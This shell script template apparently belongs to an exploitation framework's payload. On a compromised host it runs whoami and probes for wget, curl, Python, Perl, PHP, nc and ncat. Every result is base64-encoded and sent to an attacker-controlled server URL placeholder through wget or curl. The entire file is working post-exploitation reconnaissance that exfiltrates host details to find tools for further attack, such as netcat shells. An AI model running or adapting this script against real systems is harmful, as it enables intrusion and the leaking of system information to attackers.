#!/bin/sh



wget {{datastore.srvhost_url}}debug/pingback?value=$(wget --version 2>&1 | base64 -w 0 | sed -e 's/+/%2B/' -e 's#/#%2F#') -O /dev/null
curl {{datastore.srvhost_url}}debug/pingback?value=$(curl --version 2>&1 | base64 -w 0 | sed -e 's/+/%2B/' -e 's#/#%2F#') -O /dev/null

wget "{{datastore.srvhost_url}}debug/whoami?value=$(whoami 2>&1 | base64 -w 0 | sed -e 's/+/%2B/' -e 's#/#%2F#')" -O /dev/null
wget "{{datastore.srvhost_url}}debug/tools/python/?value=$(python --version 2>&1 | base64 -w 0 | sed -e 's/+/%2B/' -e 's#/#%2F#')" -O /dev/null
wget "{{datastore.srvhost_url}}debug/tools/python2.7/?value=$(python2 --version 2>&1 | base64 -w 0 | sed -e 's/+/%2B/' -e 's#/#%2F#')" -O /dev/null
wget "{{datastore.srvhost_url}}debug/tools/python3/?value=$(python3 --version 2>&1 | base64 -w 0 | sed -e 's/+/%2B/' -e 's#/#%2F#')" -O /dev/null
wget "{{datastore.srvhost_url}}debug/tools/nc/?value=$(nc -h 2>&1 | base64 -w 0 | sed -e 's/+/%2B/' -e 's#/#%2F#')" -O /dev/null
wget "{{datastore.srvhost_url}}debug/tools/ncat/?value=$(ncat -h 2>&1 | base64 -w 0 | sed -e 's/+/%2B/' -e 's#/#%2F#')" -O /dev/null
wget "{{datastore.srvhost_url}}debug/tools/perl/?value=$(perl --version 2>&1 | base64 -w 0 | sed -e 's/+/%2B/' -e 's#/#%2F#')" -O /dev/null
wget "{{datastore.srvhost_url}}debug/tools/php/?value=$(php --version 2>&1 | base64 -w 0 | sed -e 's/+/%2B/' -e 's#/#%2F#')" -O /dev/null
